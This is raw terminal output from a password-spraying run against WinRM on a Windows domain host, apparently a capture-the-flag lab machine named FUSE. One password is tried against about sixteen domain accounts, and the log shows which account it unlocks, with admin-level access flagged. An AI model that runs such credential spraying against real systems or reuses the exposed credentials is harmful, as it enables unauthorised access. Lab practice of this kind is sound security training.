[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[34m[*][0m http://10.10.10.193:5985/wsman
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\Administrator:$fab@s3Rv1ce$1 "Failed to authenticate the user Administrator with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\Guest:$fab@s3Rv1ce$1 "Failed to authenticate the user Guest with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\krbtgt:$fab@s3Rv1ce$1 "Failed to authenticate the user krbtgt with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\DefaultAccount:$fab@s3Rv1ce$1 "Failed to authenticate the user DefaultAccount with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[32m[+][0m FABRICORP\svc-print:$fab@s3Rv1ce$1 [1m[33m(Pwn3d!)[0m
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\bnielson:$fab@s3Rv1ce$1 "Failed to authenticate the user bnielson with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\sthompson:$fab@s3Rv1ce$1 "Failed to authenticate the user sthompson with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\tlavel:$fab@s3Rv1ce$1 "Failed to authenticate the user tlavel with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\pmerton:$fab@s3Rv1ce$1 "Failed to authenticate the user pmerton with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\svc-scan:$fab@s3Rv1ce$1 "Failed to authenticate the user svc-scan with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\bhult:$fab@s3Rv1ce$1 "Failed to authenticate the user bhult with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\dandrews:$fab@s3Rv1ce$1 "Failed to authenticate the user dandrews with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\mberbatov:$fab@s3Rv1ce$1 "Failed to authenticate the user mberbatov with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\astein:$fab@s3Rv1ce$1 "Failed to authenticate the user astein with ntlm"
[1m[34mWINRM[0m       10.10.10.193    5985   FUSE             [1m[31m[-][0m FABRICORP\dmuir:$fab@s3Rv1ce$1 "Failed to authenticate the user dmuir with ntlm"
